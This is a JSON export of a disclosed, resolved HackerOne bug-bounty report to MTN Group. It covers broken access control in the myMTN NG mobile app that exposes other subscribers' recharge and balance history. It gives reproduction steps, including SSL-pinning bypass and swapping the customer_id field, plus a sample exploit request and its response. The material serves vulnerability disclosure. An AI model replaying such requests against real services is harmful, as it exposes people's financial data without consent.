{
  "id": 2746709,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzQ2NzA5",
  "url": "https://hackerone.com/reports/2746709",
  "title": "Broken Access Control leads to disclosure of transaction history via /v2/rechargeTransactionHistory endpoint",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2024-09-27T17:39:30.643Z",
  "submitted_at": "2024-09-27T17:39:30.829Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hafiz-ng",
    "url": "/hafiz-ng",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/11l4r705dnelhqu4lrk2tjoxep29/727634197f209244e4307a490cdcd36c76d6e37fef1b0c164bd35ac010105f99?response-content-disposition=inline%3B%20filename%3D%22KNCXVTXz_400x400.jpg%22%3B%20filename%2A%3DUTF-8%27%27KNCXVTXz_400x400.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7PCVBGPE%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T200624Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECgaCXVzLXdlc3QtMiJIMEYCIQDL%2F3ObQLVUz7xNTAqkxcgnmszD7g3NDNN%2BHzXc%2FJ%2FMOQIhAM88enmaztjv%2FQvvm1I4uGSSTUXDr%2FI5qnn4RcrhXiwCKrIFCDEQAxoMMDEzNjE5Mjc0ODQ5IgxAoryIolTxcx6YH4sqjwURPGJoLpsajSJyHBoeb0ZLWxIhR%2B24Wjb3L0fGRJ5TwQkkD0WEgH1Lz2xoh0mFqie1XZcj1JLXXTEYjalMmgssR6bFcbU%2FpBS%2FjrqVfn4zEdvo81IuAHr7LZ8xMKTmQk5e5b8VVJrgjDT%2FcAoqBWDu%2BP9HtdDiOszt8tbhaSRDBM4MkR9boy1De1Vki%2B5QPo9gqsWctVQ3cVLHs7a9NWSvb5RI0AG%2BKA4COkUi1tmbqotArTWK7%2BeYQXI4X1AwVRsq%2FHYn9R0%2F%2By4ZhkcA0yvqbkYsE5zki1vVPE93IK2cYFiyUfi1FxDEbynQDu4gCJ6DXdlrKr4gTJCUWttDxw%2BaIZyxoKVyANHlnTHmBnZANCAX5PSYOgSZfLwWk9R7xGsPBzM2GDNK7hHhXWVu20XVMHF2utNZCsGi1ryAm35ziGTyMFLRMfWukCs%2Bl5lef18y6xvvbYMtN1aeuSiN9qPCvik9j4us69WBJBox7NZRktzhOB%2B6LZPaUPPrP%2F5t8ycR%2BOL8RTvt0OC4Xo2reehJKXpMLHVQ%2BG608InaKGh8Mayp2Ot95V8y1b%2BzMVbmWgRGwU%2FeffFMFH%2BxsyZG%2Fb6Uo8CidTPSAn6Ij6VNBmXrQdgPcgtWyFNcaqcm7aTyXvS31%2FZ58EavbzF%2FbpuxTtDXvw1voH7NDsX3v%2FsvVJL4R1CUOWAcTfkzn8n1Eo3JAsTBV5EiTJUHbdhWq%2BkJMOPcEPPKFPqfsJ%2Ft11aMMX5AqmoJs59NawHt0q3KFwju9hoTQQYHKMEwUpjMU%2BfJXnmOKp9r%2BmO9a6c2mZMVV7j3tR7Ra%2FS2WDGJmYzHdgDs0IE9rTR3xIGxmhZzH1h8tfV2yxbJgld3EzjXmwjVFkDIMPD3n8MGOrABql85ruhUvpiMFiwbU5VkmUOZY9Ski%2B41eCVLQxyh%2F5bGh2NYPfmMqCtQZAoItn5%2FVleUl0wu8eSI0YOZ6GFz5%2FyYpwRVQ2fyqIDyZJ4tZIARyUyI4LEHJHXBhj%2F2N4BRTFjmSI0%2BitksU7wWMvW0Q5W4oGkfkHoY%2Bs3dgurNMlDyKfPNS5HKgrK3l5Q5sl1%2FapEP5eXY4aQL%2BEUejqwPANQGSiYY1d993ITDdshbfrc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da082cb6d01b8e971a0724f4d8893010da48ead924383c64dab4e9b19fd085c9"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 41919,
    "url": "https://hackerone.com/mtn_group",
    "handle": "mtn_group",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "MTN Group",
      "twitter_handle": "",
      "website": "https://www.mtn.com/",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-03-02T14:56:10.848Z",
  "bug_reporter_agreed_on_going_public_at": "2025-01-31T14:56:00.924Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "An API endpoint discovered on the MyMTN NG mobile app fails to adequately enforce authorization and authentication mechanisms. Essentially, it allows a bad actor to access the transaction history details for other victims which include `rechargeDate`,  `amountAfter`,  `amountBefore` and `transactionId` due to an insufficient authorization check. \n\n## Steps To Reproduce:\n  1. Log into the **myMTN NG** mobile app.\n  2. Set up your proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism.\n  3. Visit the **transaction history** section within the app and intercept the request with your proxy tool.\n 4. Replace the `customer_id` field to any arbitrary MTN number to disclose transaction details of the victim.\n\n## Supporting Material/References:\n{█████████}\n\n**Request to vulnerable endpoint**\n```POST /api/v2/rechargeTransactionHistory HTTP/2\nHost: ████████\nContent-Type: application/json\nAccess-Control-Allow-Origin: *\nAccept: application/json\nAuthorization: ██████\nX-Country-Code: nga\nMsisdn-Code: 234\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-us\nContent-Length: 77\nUser-Agent: myMTN%20NG/14 CFNetwork/1220.1 Darwin/20.3.0\n\n{\"customer_id\":\"2347032233323\",\"start_date\":\"██████████\",\"end_date\":\"█████████\"}\n```\n\n**Response**\n```\n{\"sequenceNumber\":\"b5fb6af-bc59-57dd-a\",\"data\":[{\"rechargeDate\":\"████\",\"amountAfter\":\"878190.940000\",\"adjustmentType\":\"RECHARGE\",\"amountBefore\":\"828190.940000\",\"subscriberId\":\"2347032233323\",\"rechargeHistory\":[{\"payType\":\"VTU\",\"rechargeAmount\":\"50000.0\",\"description\":\"VTU\"}],\"transaction\":\"VTU\"},{\"rechargeDate\":\"███████\",\"amountAfter\":\"828190.940000\",\"adjustmentType\":\"RECHARGE\",\"amountBefore\":\"778190.940000\",\"subscriberId\":\"2347032233323\",\"rechargeHistory\":[{\"payType\":\"VTU\",\"rechargeAmount\":\"50000.0\",\"description\":\"VTU\"}],\"transaction\":\"VTU\"}],\"transaction\":\"VTU\"}],\"success\":true,\"resultCode\":\"0000\",\"links\":[],\"resultDescription\":\"Success\",\"transactionId\":\"████████141033000481\",\"status\":200,\"statusCode\":200}```\n\n## Impact\n\nThe potential impact this vulnerability may have on MTN NG can be summarized as follows:\n\n- The impact of this exposure of PII can be devastating to your company, with fallout ranging from recovery costs to decreased customer trust. \n-  Attackers with access to this private information about a victim can use this information to carryout other nefarious activities.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2025-03-02T14:56:01.218Z",
  "allow_singular_disclosure_after": -10732223.131288113,
  "singular_disclosure_allowed": true,
  "vote_count": 70,
  "voters": [
    "loaymorad",
    "g3ksec",
    "aboalezz",
    "almuntadhar",
    "exec_iq",
    "raslanco",
    "2026",
    "spaghettisec",
    "mohaned0101",
    "syper-shuvo",
    "and 60 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 34320,
    "asset_type": "URL",
    "asset_identifier": "mtnonline.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
